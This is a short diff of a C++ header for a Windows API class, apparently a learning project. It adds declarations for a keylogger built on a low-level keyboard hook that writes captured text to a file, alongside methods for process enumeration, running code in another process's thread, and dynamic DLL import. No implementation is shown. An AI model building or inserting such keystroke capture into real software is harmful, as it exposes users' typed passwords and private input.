@@ -14,10 +14,17 @@ typedef struct {
 
 class WinApi {
 private:
+	static int __textWriteToFile(std::string);
+	static HHOOK _hook;
+	static KBDLLHOOKSTRUCT kbdStruct;
+	static LRESULT __stdcall __HookCallback(int, WPARAM, LPARAM);
+	void __ReleaseHook();
+	void __SetHook();
 	void __PrintProcessNameAndID(DWORD);
-	static void WINAPI __MsgBoxWrap(MsgParam* p);
+	static void WINAPI __MsgBoxWrap(MsgParam*);
 	static void __after_MsgBoxWrap();
 public:
+	void _Keylogger();
 	void _RunMessageBoxInAnotherProcessThread();
 	void _EnumSystemProcesses();
 	void _DynamicDLLImport();
